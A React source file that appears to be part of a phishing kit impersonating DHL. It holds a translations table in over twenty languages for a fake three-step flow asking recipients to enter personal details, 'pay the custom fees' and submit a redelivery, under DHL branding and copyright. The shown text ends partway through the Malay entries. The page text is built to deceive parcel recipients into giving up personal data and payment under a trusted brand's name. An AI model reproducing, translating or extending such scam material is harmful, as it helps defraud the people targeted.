import React, { useState, useEffect } from "react";

// ============================================
// LANGUAGE TRANSLATIONS - ALL LANGUAGES ADDED
// ============================================
const translations = {
  en: {
    step1Label: "Fill Information & Details",
    step2Label: "Pay the Custom Fees",
    step3Label: "Submit Redelivery",
    formTitle: "Fill Your Information & Details",
    firstName: "First Name",
    lastName: "Last Name",
    email: "Email Address",
    addressCountry: "Address Country",
    street: "Street Address",
    city: "City",
    state: "State / Region",
    zip: "ZIP / Postal Code",
    phone: "Phone Number",
    terms: "I have read and accept the",
    termsLink: "Digital Customs Invoice Terms and Conditions",
    submitBtn: "Submit & Continue to Payment",
    processingBtn: "Processing...",
    errorFillAll: "Please fill in all required fields",
    errorValidEmail: "Please enter a valid email address",
    errorTerms: "Please accept the Terms and Conditions",
    errorGeneric: "Something went wrong",
    errorNetwork: "Network error. Please make sure the backend server is running",
    success: "Form submitted successfully!",
    privacyNotice: "Privacy Notice",
    consentSettings: "Consent Settings",
    copyright: "DHL Group - All rights reserved",
    language: "Language",
  },
  fr: {
    step1Label: "Remplir les informations",
    step2Label: "Payer les frais de douane",
    step3Label: "Soumettre une nouvelle livraison",
    formTitle: "Remplissez vos informations",
    firstName: "Prénom",
    lastName: "Nom",
    email: "Adresse e-mail",
    addressCountry: "Pays de l'adresse",
    street: "Adresse",
    city: "Ville",
    state: "État / Région",
    zip: "Code postal",
    phone: "Numéro de téléphone",
    terms: "J'ai lu et j'accepte les",
    termsLink: "Conditions générales de la facture douanière numérique",
    submitBtn: "Soumettre et continuer vers le paiement",
    processingBtn: "Traitement...",
    errorFillAll: "Veuillez remplir tous les champs requis",
    errorValidEmail: "Veuillez entrer une adresse e-mail valide",
    errorTerms: "Veuillez accepter les conditions générales",
    errorGeneric: "Quelque chose s'est mal passé",
    errorNetwork: "Erreur réseau. Assurez-vous que le serveur backend est en cours d'exécution",
    success: "Formulaire soumis avec succès !",
    privacyNotice: "Avis de confidentialité",
    consentSettings: "Paramètres de consentement",
    copyright: "DHL Group - Tous droits réservés",
    language: "Langue",
  },
  es: {
    step1Label: "Complete información y detalles",
    step2Label: "Pagar aranceles aduaneros",
    step3Label: "Solicitar nueva entrega",
    formTitle: "Complete su información y detalles",
    firstName: "Nombre",
    lastName: "Apellido",
    email: "Correo electrónico",
    addressCountry: "País de dirección",
    street: "Dirección",
    city: "Ciudad",
    state: "Estado / Región",
    zip: "Código postal",
    phone: "Número de teléfono",
    terms: "He leído y acepto los",
    termsLink: "Términos y condiciones de la factura aduanera digital",
    submitBtn: "Enviar y continuar al pago",
    processingBtn: "Procesando...",
    errorFillAll: "Por favor complete todos los campos requeridos",
    errorValidEmail: "Por favor ingrese un correo electrónico válido",
    errorTerms: "Por favor acepte los Términos y Condiciones",
    errorGeneric: "Algo salió mal",
    errorNetwork: "Error de red. Asegúrese de que el servidor backend esté ejecutándose",
    success: "¡Formulario enviado con éxito!",
    privacyNotice: "Aviso de privacidad",
    consentSettings: "Configuración de consentimiento",
    copyright: "DHL Group - Todos los derechos reservados",
    language: "Idioma",
  },
  ar: {
    step1Label: "ملء المعلومات والتفاصيل",
    step2Label: "دفع الرسوم الجمركية",
    step3Label: "تقديم طلب إعادة التسليم",
    formTitle: "املأ معلوماتك وتفاصيلك",
    firstName: "الاسم الأول",
    lastName: "اسم العائلة",
    email: "البريد الإلكتروني",
    addressCountry: "بلد العنوان",
    street: "عنوان الشارع",
    city: "المدينة",
    state: "الولاية / المنطقة",
    zip: "الرمز البريدي",
    phone: "رقم الهاتف",
    terms: "لقد قرأت وأوافق على",
    termsLink: "الشروط والأحكام الخاصة بالفاتورة الجمركية الرقمية",
    submitBtn: "إرسال والمتابعة إلى الدفع",
    processingBtn: "جارٍ المعالجة...",
    errorFillAll: "يرجى ملء جميع الحقول المطلوبة",
    errorValidEmail: "يرجى إدخال عنوان بريد إلكتروني صحيح",
    errorTerms: "يرجى قبول الشروط والأحكام",
    errorGeneric: "حدث خطأ ما",
    errorNetwork: "خطأ في الشبكة. يرجى التأكد من تشغيل الخادم الخلفي",
    success: "تم إرسال النموذج بنجاح!",
    privacyNotice: "إشعار الخصوصية",
    consentSettings: "إعدادات الموافقة",
    copyright: "مجموعة DHL - جميع الحقوق محفوظة",
    language: "اللغة",
  },
  de: {
    step1Label: "Informationen und Details ausfüllen",
    step2Label: "Zollgebühren bezahlen",
    step3Label: "Neuzustellung beantragen",
    formTitle: "Ihre Informationen und Details",
    firstName: "Vorname",
    lastName: "Nachname",
    email: "E-Mail-Adresse",
    addressCountry: "Land der Adresse",
    street: "Straße",
    city: "Stadt",
    state: "Bundesland / Region",
    zip: "Postleitzahl",
    phone: "Telefonnummer",
    terms: "Ich habe die gelesen und akzeptiere die",
    termsLink: "Allgemeinen Geschäftsbedingungen der digitalen Zollrechnung",
    submitBtn: "Absenden und zur Zahlung fortfahren",
    processingBtn: "Verarbeitung...",
    errorFillAll: "Bitte füllen Sie alle Pflichtfelder aus",
    errorValidEmail: "Bitte geben Sie eine gültige E-Mail-Adresse ein",
    errorTerms: "Bitte akzeptieren Sie die Allgemeinen Geschäftsbedingungen",
    errorGeneric: "Etwas ist schief gelaufen",
    errorNetwork: "Netzwerkfehler. Bitte stellen Sie sicher, dass der Backend-Server läuft",
    success: "Formular erfolgreich übermittelt!",
    privacyNotice: "Datenschutzerklärung",
    consentSettings: "Zustimmungseinstellungen",
    copyright: "DHL Group - Alle Rechte vorbehalten",
    language: "Sprache",
  },
  pt: {
    step1Label: "Preencher informações e detalhes",
    step2Label: "Pagar as taxas alfandegárias",
    step3Label: "Solicitar nova entrega",
    formTitle: "Preencha suas informações e detalhes",
    firstName: "Primeiro nome",
    lastName: "Sobrenome",
    email: "Endereço de e-mail",
    addressCountry: "País do endereço",
    street: "Endereço",
    city: "Cidade",
    state: "Estado / Região",
    zip: "CEP / Código postal",
    phone: "Número de telefone",
    terms: "Li e aceito os",
    termsLink: "Termos e Condições da Fatura Aduaneira Digital",
    submitBtn: "Enviar e continuar para pagamento",
    processingBtn: "Processando...",
    errorFillAll: "Por favor, preencha todos os campos obrigatórios",
    errorValidEmail: "Por favor, insira um endereço de e-mail válido",
    errorTerms: "Por favor, aceite os Termos e Condições",
    errorGeneric: "Algo deu errado",
    errorNetwork: "Erro de rede. Certifique-se de que o servidor backend está em execução",
    success: "Formulário enviado com sucesso!",
    privacyNotice: "Aviso de privacidade",
    consentSettings: "Configurações de consentimento",
    copyright: "DHL Group - Todos os direitos reservados",
    language: "Idioma",
  },
  tr: {
    step1Label: "Bilgi ve Detayları Doldurun",
    step2Label: "Gümrük Ücretlerini Ödeyin",
    step3Label: "Yeniden Teslim Talebi Gönderin",
    formTitle: "Bilgi ve Detaylarınızı Doldurun",
    firstName: "Ad",
    lastName: "Soyad",
    email: "E-posta Adresi",
    addressCountry: "Adres Ülkesi",
    street: "Cadde Adresi",
    city: "Şehir",
    state: "Eyalet / Bölge",
    zip: "Posta Kodu",
    phone: "Telefon Numarası",
    terms: "Okudum ve kabul ediyorum",
    termsLink: "Dijital Gümrük Faturası Hüküm ve Koşulları",
    submitBtn: "Gönder ve Ödemeye Devam Et",
    processingBtn: "İşleniyor...",
    errorFillAll: "Lütfen tüm zorunlu alanları doldurun",
    errorValidEmail: "Lütfen geçerli bir e-posta adresi girin",
    errorTerms: "Lütfen Hüküm ve Koşulları kabul edin",
    errorGeneric: "Bir şeyler yanlış gitti",
    errorNetwork: "Ağ hatası. Lütfen arka uç sunucusunun çalıştığından emin olun",
    success: "Form başarıyla gönderildi!",
    privacyNotice: "Gizlilik Bildirimi",
    consentSettings: "Onay Ayarları",
    copyright: "DHL Grubu - Tüm hakları saklıdır",
    language: "Dil",
  },
  it: {
    step1Label: "Compila informazioni e dettagli",
    step2Label: "Paga le spese doganali",
    step3Label: "Invia nuova consegna",
    formTitle: "Compila le tue informazioni e dettagli",
    firstName: "Nome",
    lastName: "Cognome",
    email: "Indirizzo email",
    addressCountry: "Paese dell'indirizzo",
    street: "Indirizzo",
    city: "Città",
    state: "Stato / Regione",
    zip: "CAP / Codice postale",
    phone: "Numero di telefono",
    terms: "Ho letto e accetto i",
    termsLink: "Termini e condizioni della fattura doganale digitale",
    submitBtn: "Invia e continua al pagamento",
    processingBtn: "Elaborazione in corso...",
    errorFillAll: "Si prega di compilare tutti i campi obbligatori",
    errorValidEmail: "Inserisci un indirizzo email valido",
    errorTerms: "Accetta i Termini e Condizioni",
    errorGeneric: "Qualcosa è andato storto",
    errorNetwork: "Errore di rete. Verificare che il server backend sia in esecuzione",
    success: "Modulo inviato con successo!",
    privacyNotice: "Informativa sulla privacy",
    consentSettings: "Impostazioni del consenso",
    copyright: "DHL Group - Tutti i diritti riservati",
    language: "Lingua",
  },
  ru: {
    step1Label: "Заполните информацию и данные",
    step2Label: "Оплатить таможенные сборы",
    step3Label: "Отправить повторную доставку",
    formTitle: "Заполните информацию и данные",
    firstName: "Имя",
    lastName: "Фамилия",
    email: "Адрес электронной почты",
    addressCountry: "Страна адреса",
    street: "Улица",
    city: "Город",
    state: "Область / Регион",
    zip: "Почтовый индекс",
    phone: "Номер телефона",
    terms: "Я прочитал и принимаю",
    termsLink: "Условия цифрового таможенного счета",
    submitBtn: "Отправить и продолжить оплату",
    processingBtn: "Обработка...",
    errorFillAll: "Пожалуйста, заполните все обязательные поля",
    errorValidEmail: "Пожалуйста, введите действительный адрес электронной почты",
    errorTerms: "Пожалуйста, примите Условия",
    errorGeneric: "Что-то пошло не так",
    errorNetwork: "Сетевая ошибка. Убедитесь, что сервер работает",
    success: "Форма успешно отправлена!",
    privacyNotice: "Уведомление о конфиденциальности",
    consentSettings: "Настройки согласия",
    copyright: "DHL Group - Все права защищены",
    language: "Язык",
  },
  zh: {
    step1Label: "填写信息和详情",
    step2Label: "支付海关费用",
    step3Label: "提交重新派送",
    formTitle: "填写您的信息和详情",
    firstName: "名",
    lastName: "姓",
    email: "电子邮件地址",
    addressCountry: "地址国家",
    street: "街道地址",
    city: "城市",
    state: "州 / 地区",
    zip: "邮政编码",
    phone: "电话号码",
    terms: "我已阅读并接受",
    termsLink: "数字海关发票条款和条件",
    submitBtn: "提交并继续付款",
    processingBtn: "处理中...",
    errorFillAll: "请填写所有必填字段",
    errorValidEmail: "请输入有效的电子邮件地址",
    errorTerms: "请接受条款和条件",
    errorGeneric: "出了点问题",
    errorNetwork: "网络错误。请确保后端服务器正在运行",
    success: "表格提交成功！",
    privacyNotice: "隐私声明",
    consentSettings: "同意设置",
    copyright: "DHL集团 - 保留所有权利",
    language: "语言",
  },
  ko: {
    step1Label: "정보 및 세부사항 입력",
    step2Label: "관세 비용 결제",
    step3Label: "재배송 신청",
    formTitle: "정보 및 세부사항을 입력하세요",
    firstName: "이름",
    lastName: "성",
    email: "이메일 주소",
    addressCountry: "주소 국가",
    street: "도로명 주소",
    city: "도시",
    state: "주 / 지역",
    zip: "우편번호",
    phone: "전화번호",
    terms: "다음 약관을 읽고 동의합니다:",
    termsLink: "디지털 세관 송장 이용약관",
    submitBtn: "제출 및 결제로 계속하기",
    processingBtn: "처리 중...",
    errorFillAll: "모든 필수 필드를 입력해주세요",
    errorValidEmail: "유효한 이메일 주소를 입력해주세요",
    errorTerms: "이용약관에 동의해주세요",
    errorGeneric: "문제가 발생했습니다",
    errorNetwork: "네트워크 오류. 백엔드 서버가 실행 중인지 확인해주세요",
    success: "양식이 성공적으로 제출되었습니다!",
    privacyNotice: "개인정보 보호정책",
    consentSettings: "동의 설정",
    copyright: "DHL 그룹 - 모든 권리 보유",
    language: "언어",
  },
  ja: {
    step1Label: "情報と詳細を入力",
    step2Label: "関税費用を支払う",
    step3Label: "再配達を申請",
    formTitle: "情報と詳細を入力してください",
    firstName: "名",
    lastName: "姓",
    email: "メールアドレス",
    addressCountry: "住所の国",
    street: "番地",
    city: "市区町村",
    state: "都道府県",
    zip: "郵便番号",
    phone: "電話番号",
    terms: "以下の利用規約を読み、同意します",
    termsLink: "デジタル税関請求書の利用規約",
    submitBtn: "送信して支払いへ進む",
    processingBtn: "処理中...",
    errorFillAll: "すべての必須項目を入力してください",
    errorValidEmail: "有効なメールアドレスを入力してください",
    errorTerms: "利用規約に同意してください",
    errorGeneric: "問題が発生しました",
    errorNetwork: "ネットワークエラー。バックエンドサーバーが実行中であることを確認してください",
    success: "フォームが正常に送信されました！",
    privacyNotice: "プライバシー通知",
    consentSettings: "同意設定",
    copyright: "DHLグループ - 全著作権所有",
    language: "言語",
  },
  pl: {
    step1Label: "Wypełnij informacje i szczegóły",
    step2Label: "Zapłać opłaty celne",
    step3Label: "Złóż wniosek o ponowną dostawę",
    formTitle: "Wypełnij swoje informacje i szczegóły",
    firstName: "Imię",
    lastName: "Nazwisko",
    email: "Adres e-mail",
    addressCountry: "Kraj adresu",
    street: "Ulica",
    city: "Miasto",
    state: "Województwo / Region",
    zip: "Kod pocztowy",
    phone: "Numer telefonu",
    terms: "Przeczytałem i akceptuję",
    termsLink: "Warunki cyfrowej faktury celnej",
    submitBtn: "Prześlij i kontynuuj do płatności",
    processingBtn: "Przetwarzanie...",
    errorFillAll: "Proszę wypełnić wszystkie wymagane pola",
    errorValidEmail: "Proszę podać poprawny adres e-mail",
    errorTerms: "Proszę zaakceptować Warunki",
    errorGeneric: "Coś poszło nie tak",
    errorNetwork: "Błąd sieci. Upewnij się, że serwer backend działa",
    success: "Formularz wysłany pomyślnie!",
    privacyNotice: "Polityka prywatności",
    consentSettings: "Ustawienia zgody",
    copyright: "DHL Group - Wszelkie prawa zastrzeżone",
    language: "Język",
  },
  nl: {
    step1Label: "Informatie en details invullen",
    step2Label: "Betaal de douanekosten",
    step3Label: "Herlevering aanvragen",
    formTitle: "Vul uw informatie en details in",
    firstName: "Voornaam",
    lastName: "Achternaam",
    email: "E-mailadres",
    addressCountry: "Land van adres",
    street: "Straatnaam",
    city: "Stad",
    state: "Provincie / Regio",
    zip: "Postcode",
    phone: "Telefoonnummer",
    terms: "Ik heb gelezen en ga akkoord met de",
    termsLink: "Algemene Voorwaarden van de Digitale Douanefactuur",
    submitBtn: "Verzenden en doorgaan naar betaling",
    processingBtn: "Verwerken...",
    errorFillAll: "Vul alle verplichte velden in",
    errorValidEmail: "Voer een geldig e-mailadres in",
    errorTerms: "Accepteer de Algemene Voorwaarden",
    errorGeneric: "Er is iets misgegaan",
    errorNetwork: "Netwerkfout. Zorg ervoor dat de backendserver draait",
    success: "Formulier succesvol verzonden!",
    privacyNotice: "Privacyverklaring",
    consentSettings: "Toestemmingsinstellingen",
    copyright: "DHL Group - Alle rechten voorbehouden",
    language: "Taal",
  },
  th: {
    step1Label: "กรอกข้อมูลและรายละเอียด",
    step2Label: "ชำระค่าธรรมเนียมศุลกากร",
    step3Label: "ส่งคำขอจัดส่งใหม่",
    formTitle: "กรอกข้อมูลและรายละเอียดของคุณ",
    firstName: "ชื่อ",
    lastName: "นามสกุล",
    email: "ที่อยู่อีเมล",
    addressCountry: "ประเทศที่อยู่",
    street: "ที่อยู่",
    city: "เมือง",
    state: "รัฐ / ภูมิภาค",
    zip: "รหัสไปรษณีย์",
    phone: "หมายเลขโทรศัพท์",
    terms: "ฉันได้อ่านและยอมรับ",
    termsLink: "ข้อกำหนดและเงื่อนไขใบแจ้งหนี้ศุลกากรดิจิทัล",
    submitBtn: "ส่งและดำเนินการชำระเงิน",
    processingBtn: "กำลังดำเนินการ...",
    errorFillAll: "กรุณากรอกข้อมูลในช่องที่ต้องกรอกทั้งหมด",
    errorValidEmail: "กรุณากรอกที่อยู่อีเมลที่ถูกต้อง",
    errorTerms: "กรุณายอมรับข้อกำหนดและเงื่อนไข",
    errorGeneric: "เกิดข้อผิดพลาดบางประการ",
    errorNetwork: "ข้อผิดพลาดของเครือข่าย โปรดตรวจสอบว่าเซิร์ฟเวอร์แบ็กเอนด์ทำงานอยู่",
    success: "ส่งแบบฟอร์มสำเร็จ!",
    privacyNotice: "ประกาศความเป็นส่วนตัว",
    consentSettings: "การตั้งค่าการยินยอม",
    copyright: "DHL กรุ๊ป - สงวนลิขสิทธิ์ทั้งหมด",
    language: "ภาษา",
  },
  id: {
    step1Label: "Isi Informasi & Detail",
    step2Label: "Bayar Biaya Bea Cukai",
    step3Label: "Kirim Pengiriman Ulang",
    formTitle: "Isi Informasi & Detail Anda",
    firstName: "Nama Depan",
    lastName: "Nama Belakang",
    email: "Alamat Email",
    addressCountry: "Negara Alamat",
    street: "Alamat Jalan",
    city: "Kota",
    state: "Provinsi / Wilayah",
    zip: "Kode Pos",
    phone: "Nomor Telepon",
    terms: "Saya telah membaca dan menerima",
    termsLink: "Syarat dan Ketentuan Faktur Bea Cukai Digital",
    submitBtn: "Kirim & Lanjutkan ke Pembayaran",
    processingBtn: "Memproses...",
    errorFillAll: "Harap isi semua bidang yang wajib diisi",
    errorValidEmail: "Harap masukkan alamat email yang valid",
    errorTerms: "Harap terima Syarat dan Ketentuan",
    errorGeneric: "Ada yang salah",
    errorNetwork: "Kesalahan jaringan. Pastikan server backend berjalan",
    success: "Formulir berhasil dikirim!",
    privacyNotice: "Pemberitahuan Privasi",
    consentSettings: "Pengaturan Persetujuan",
    copyright: "DHL Group - Semua hak dilindungi",
    language: "Bahasa",
  },
  vi: {
    step1Label: "Điền thông tin và chi tiết",
    step2Label: "Thanh toán phí hải quan",
    step3Label: "Gửi yêu cầu giao lại",
    formTitle: "Điền thông tin và chi tiết của bạn",
    firstName: "Tên",
    lastName: "Họ",
    email: "Địa chỉ Email",
    addressCountry: "Quốc gia địa chỉ",
    street: "Địa chỉ đường",
    city: "Thành phố",
    state: "Tiểu bang / Khu vực",
    zip: "Mã bưu điện",
    phone: "Số điện thoại",
    terms: "Tôi đã đọc và chấp nhận",
    termsLink: "Điều khoản và Điều kiện của Hóa đơn Hải quan Kỹ thuật số",
    submitBtn: "Gửi và Tiếp tục thanh toán",
    processingBtn: "Đang xử lý...",
    errorFillAll: "Vui lòng điền tất cả các trường bắt buộc",
    errorValidEmail: "Vui lòng nhập địa chỉ email hợp lệ",
    errorTerms: "Vui lòng chấp nhận Điều khoản và Điều kiện",
    errorGeneric: "Đã xảy ra lỗi",
    errorNetwork: "Lỗi mạng. Vui lòng đảm bảo máy chủ backend đang chạy",
    success: "Gửi biểu mẫu thành công!",
    privacyNotice: "Thông báo Quyền riêng tư",
    consentSettings: "Cài đặt chấp thuận",
    copyright: "Tập đoàn DHL - Đã đăng ký bản quyền",
    language: "Ngôn ngữ",
  },
  // لغات إضافية من القوائم الأخرى
  sv: {
    step1Label: "Fyll i information och detaljer",
    step2Label: "Betala tullavgifterna",
    step3Label: "Skicka omleverans",
    formTitle: "Fyll i din information och detaljer",
    firstName: "Förnamn",
    lastName: "Efternamn",
    email: "E-postadress",
    addressCountry: "Adressland",
    street: "Gatuadress",
    city: "Stad",
    state: "Delstat / Region",
    zip: "Postnummer",
    phone: "Telefonnummer",
    terms: "Jag har läst och accepterar",
    termsLink: "Villkor för digital tulldeklaration",
    submitBtn: "Skicka och fortsätt till betalning",
    processingBtn: "Bearbetar...",
    errorFillAll: "Fyll i alla obligatoriska fält",
    errorValidEmail: "Ange en giltig e-postadress",
    errorTerms: "Acceptera villkoren",
    errorGeneric: "Något gick fel",
    errorNetwork: "Nätverksfel. Kontrollera att backend-servern körs",
    success: "Formulär skickat!",
    privacyNotice: "Integritetspolicy",
    consentSettings: "Samtyckesinställningar",
    copyright: "DHL Group - Alla rättigheter förbehållna",
    language: "Språk",
  },
  no: {
    step1Label: "Fyll ut informasjon og detaljer",
    step2Label: "Betal tollavgiftene",
    step3Label: "Send på nytt",
    formTitle: "Fyll ut din informasjon og detaljer",
    firstName: "Fornavn",
    lastName: "Etternavn",
    email: "E-postadresse",
    addressCountry: "Adresseland",
    street: "Gateadresse",
    city: "By",
    state: "Stat / Region",
    zip: "Postnummer",
    phone: "Telefonnummer",
    terms: "Jeg har lest og godtar",
    termsLink: "Vilkår for digital tollfaktura",
    submitBtn: "Send og fortsett til betaling",
    processingBtn: "Behandler...",
    errorFillAll: "Fyll ut alle obligatoriske felt",
    errorValidEmail: "Vennligst oppgi en gyldig e-postadresse",
    errorTerms: "Vennligst godta vilkårene",
    errorGeneric: "Noe gikk galt",
    errorNetwork: "Nettverksfeil. Sørg for at backend-serveren kjører",
    success: "Skjema sendt!",
    privacyNotice: "Personvernerklæring",
    consentSettings: "Samtykkeinnstillinger",
    copyright: "DHL Group - Alle rettigheter forbeholdt",
    language: "Språk",
  },
  da: {
    step1Label: "Udfyld information og detaljer",
    step2Label: "Betal toldafgifterne",
    step3Label: "Indsend genlevering",
    formTitle: "Udfyld dine oplysninger og detaljer",
    firstName: "Fornavn",
    lastName: "Efternavn",
    email: "E-mailadresse",
    addressCountry: "Adresseland",
    street: "Gade",
    city: "By",
    state: "Stat / Region",
    zip: "Postnummer",
    phone: "Telefonnummer",
    terms: "Jeg har læst og accepterer",
    termsLink: "Vilkår for digital toldfaktura",
    submitBtn: "Indsend og fortsæt til betaling",
    processingBtn: "Behandler...",
    errorFillAll: "Udfyld alle obligatoriske felter",
    errorValidEmail: "Indtast en gyldig e-mailadresse",
    errorTerms: "Accepter venligst vilkårene",
    errorGeneric: "Noget gik galt",
    errorNetwork: "Netværksfejl. Sørg for, at backend-serveren kører",
    success: "Formular indsendt!",
    privacyNotice: "Privatlivspolitik",
    consentSettings: "Samtykkeindstillinger",
    copyright: "DHL Group - Alle rettigheder forbeholdes",
    language: "Sprog",
  },
  fi: {
    step1Label: "Täytä tiedot ja yksityiskohdat",
    step2Label: "Maksa tullimaksut",
    step3Label: "Lähetä uudelleentoimitus",
    formTitle: "Täytä tietosi ja yksityiskohdat",
    firstName: "Etunimi",
    lastName: "Sukunimi",
    email: "Sähköpostiosoite",
    addressCountry: "Osoitemaa",
    street: "Katuosoite",
    city: "Kaupunki",
    state: "Osavaltio / Alue",
    zip: "Postinumero",
    phone: "Puhelinnumero",
    terms: "Olen lukenut ja hyväksyn",
    termsLink: "Digitaalisen tullilaskun ehdot",
    submitBtn: "Lähetä ja jatka maksuun",
    processingBtn: "Käsitellään...",
    errorFillAll: "Täytä kaikki pakolliset kentät",
    errorValidEmail: "Anna kelvollinen sähköpostiosoite",
    errorTerms: "Hyväksy ehdot",
    errorGeneric: "Jotain meni pieleen",
    errorNetwork: "Verkkovirhe. Varmista, että backend-palvelin toimii",
    success: "Lomake lähetetty onnistuneesti!",
    privacyNotice: "Tietosuojailmoitus",
    consentSettings: "Suostumusasetukset",
    copyright: "DHL Group - Kaikki oikeudet pidätetään",
    language: "Kieli",
  },
  el: {
    step1Label: "Συμπληρώστε πληροφορίες και λεπτομέρειες",
    step2Label: "Πληρώστε τα τελωνειακά τέλη",
    step3Label: "Υποβολή εκ νέου παράδοσης",
    formTitle: "Συμπληρώστε τις πληροφορίες σας",
    firstName: "Όνομα",
    lastName: "Επίθετο",
    email: "Διεύθυνση email",
    addressCountry: "Χώρα διεύθυνσης",
    street: "Οδός",
    city: "Πόλη",
    state: "Πολιτεία / Περιοχή",
    zip: "Ταχυδρομικός κώδικας",
    phone: "Αριθμός τηλεφώνου",
    terms: "Έχω διαβάσει και αποδέχομαι τους",
    termsLink: "Όρους ψηφιακού τελωνειακού τιμολογίου",
    submitBtn: "Υποβολή και συνέχεια στην πληρωμή",
    processingBtn: "Επεξεργασία...",
    errorFillAll: "Συμπληρώστε όλα τα υποχρεωτικά πεδία",
    errorValidEmail: "Εισάγετε έγκυρη διεύθυνση email",
    errorTerms: "Αποδεχτείτε τους Όρους",
    errorGeneric: "Κάτι πήγε στραβά",
    errorNetwork: "Σφάλμα δικτύου. Βεβαιωθείτε ότι ο backend server λειτουργεί",
    success: "Η φόρμα υποβλήθηκε επιτυχώς!",
    privacyNotice: "Δήλωση απορρήτου",
    consentSettings: "Ρυθμίσεις συναίνεσης",
    copyright: "DHL Group - Με επιφύλαξη παντός δικαιώματος",
    language: "Γλώσσα",
  },
  cs: {
    step1Label: "Vyplňte informace a podrobnosti",
    step2Label: "Zaplaťte clo",
    step3Label: "Odeslat opakované doručení",
    formTitle: "Vyplňte své informace a podrobnosti",
    firstName: "Jméno",
    lastName: "Příjmení",
    email: "Emailová adresa",
    addressCountry: "Země adresy",
    street: "Ulice",
    city: "Město",
    state: "Stát / Region",
    zip: "PSČ",
    phone: "Telefonní číslo",
    terms: "Přečetl(a) jsem a souhlasím s",
    termsLink: "Podmínkami digitální celní faktury",
    submitBtn: "Odeslat a pokračovat k platbě",
    processingBtn: "Zpracování...",
    errorFillAll: "Vyplňte všechna povinná pole",
    errorValidEmail: "Zadejte platnou emailovou adresu",
    errorTerms: "Přijměte Podmínky",
    errorGeneric: "Něco se pokazilo",
    errorNetwork: "Chyba sítě. Ujistěte se, že backend server běží",
    success: "Formulář úspěšně odeslán!",
    privacyNotice: "Ochrana soukromí",
    consentSettings: "Nastavení souhlasu",
    copyright: "Skupina DHL – Všechna práva vyhrazena",
    language: "Jazyk",
  },
  he: {
    step1Label: "מלא מידע ופרטים",
    step2Label: "שלם את דמי המכס",
    step3Label: "שלח משלוח חוזר",
    formTitle: "מלא את המידע והפרטים שלך",
    firstName: "שם פרטי",
    lastName: "שם משפחה",
    email: "כתובת אימייל",
    addressCountry: "מדינת הכתובת",
    street: "כתובת רחוב",
    city: "עיר",
    state: "מדינה / אזור",
    zip: "מיקוד",
    phone: "מספר טלפון",
    terms: "קראתי ומקבל את",
    termsLink: "תנאי חשבון המכס הדיגיטלי",
    submitBtn: "שלח והמשך לתשלום",
    processingBtn: "מעבד...",
    errorFillAll: "אנא מלא את כל השדות הנדרשים",
    errorValidEmail: "אנא הזן כתובת אימייל תקינה",
    errorTerms: "אנא קבל את התנאים",
    errorGeneric: "משהו השתבש",
    errorNetwork: "שגיאת רשת. אנא ודא שהשר backend פועל",
    success: "הטופס נשלח בהצלחה!",
    privacyNotice: "הצהרת פרטיות",
    consentSettings: "הגדרות הסכמה",
    copyright: "קבוצת DHL - כל הזכויות שמורות",
    language: "שפה",
  },
  ur: {
    step1Label: "معلومات اور تفصیلات پُر کریں",
    step2Label: "کسٹم فیس ادا کریں",
    step3Label: "دوبارہ ترسیل جمع کروائیں",
    formTitle: "اپنی معلومات اور تفصیلات پُر کریں",
    firstName: "پہلا نام",
    lastName: "آخری نام",
    email: "ای میل ایڈریس",
    addressCountry: "پتہ کا ملک",
    street: "گلی کا پتہ",
    city: "شہر",
    state: "ریاست / علاقہ",
    zip: "زپ / پوسٹل کوڈ",
    phone: "فون نمبر",
    terms: "میں نے پڑھ لیا ہے اور قبول کرتا ہوں",
    termsLink: "ڈیجیٹل کسٹم انوائس کی شرائط و ضوابط",
    submitBtn: "جمع کریں اور ادائیگی جاری رکھیں",
    processingBtn: "پروسیسنگ...",
    errorFillAll: "براہ کرم تمام ضروری فیلڈز پُر کریں",
    errorValidEmail: "براہ کرم درست ای میل ایڈریس درج کریں",
    errorTerms: "براہ کرم شرائط و ضوابط قبول کریں",
    errorGeneric: "کچھ غلط ہو گیا",
    errorNetwork: "نیٹ ورک کی خرابی۔ براہ کرم یقینی بنائیں کہ بیک اینڈ سرور چل رہا ہے",
    success: "فارم کامیابی سے جمع کر دیا گیا!",
    privacyNotice: "رازداری کا نوٹس",
    consentSettings: "رضامندی کی ترتیبات",
    copyright: "DHL گروپ - جملہ حقوق محفوظ ہیں",
    language: "زبان",
  },
  bn: {
    step1Label: "তথ্য ও বিবরণ পূরণ করুন",
    step2Label: "কাস্টম ফিস পরিশোধ করুন",
    step3Label: "পুনরায় ডেলিভরি জমা দিন",
    formTitle: "আপনার তথ্য ও বিবরণ পূরণ করুন",
    firstName: "প্রথম নাম",
    lastName: "শেষ নাম",
    email: "ইমেইল ঠিকানা",
    addressCountry: "ঠিকানার দেশ",
    street: "রাস্তার ঠিকানা",
    city: "শহর",
    state: "রাজ্য / অঞ্চল",
    zip: "জিপ / পোস্টাল কোড",
    phone: "ফোন নম্বর",
    terms: "আমি পড়েছি এবং গ্রহণ করছি",
    termsLink: "ডিজিটাল কাস্টম ইনভয়েসের শর্তাবলী",
    submitBtn: "জমা দিন ও পেমেন্টে যান",
    processingBtn: "প্রক্রিয়াকরণ...",
    errorFillAll: "দয়া করে সব প্রয়োজনীয় ক্ষেত্র পূরণ করুন",
    errorValidEmail: "দয়া করে একটি বৈধ ইমেইল ঠিকানা দিন",
    errorTerms: "দয়া করে শর্তাবলী গ্রহণ করুন",
    errorGeneric: "কিছু ভুল হয়েছে",
    errorNetwork: "নেটওয়ার্ক ত্রুটি। ব্যাকএন্ড সার্ভার চলমান আছে কিনা নিশ্চিত করুন",
    success: "ফর্ম সফলভাবে জমা দেওয়া হয়েছে!",
    privacyNotice: "গোপনীয়তা বিজ্ঞপ্তি",
    consentSettings: "সম্মতি সেটিংস",
    copyright: "DHL গ্রুপ - সর্বস্বত্ব সংরক্ষিত",
    language: "ভাষা",
  },
  ms: {
    step1Label: "Isi Maklumat & Butiran",
    step2Label: "Bayar Yuran Kastam",
    step3Label: "Hantar Penghantaran Semula",
    formTitle: "Isi Maklumat & Butiran Anda",
    firstName: "Nama Pertama",
    lastName: "Nama Keluarga",
    email: "Alamat E-mel",
    addressCountry: "Negara Alamat",
    street: "Alamat Jalan",
    city: "Bandar",
    state: "Negeri / Wilayah",
    zip: "Poskod",
    phone: "Nombor Telefon",
    terms: "Saya telah membaca dan menerima",
    termsLink: "Terma dan Syarat Invois Kastam Digital",
    submitBtn: "Hantar & Teruskan ke Pembayaran",
    processingBtn: "Memproses...",
    errorFillAll: "Sila isi semua ruangan yang diperlukan",
    errorValidEmail: "Sila masukkan alamat e-mel yang sah",
    errorTerms: "Sila terima Terma dan Syarat",
    errorGeneric: "Ada masalah",
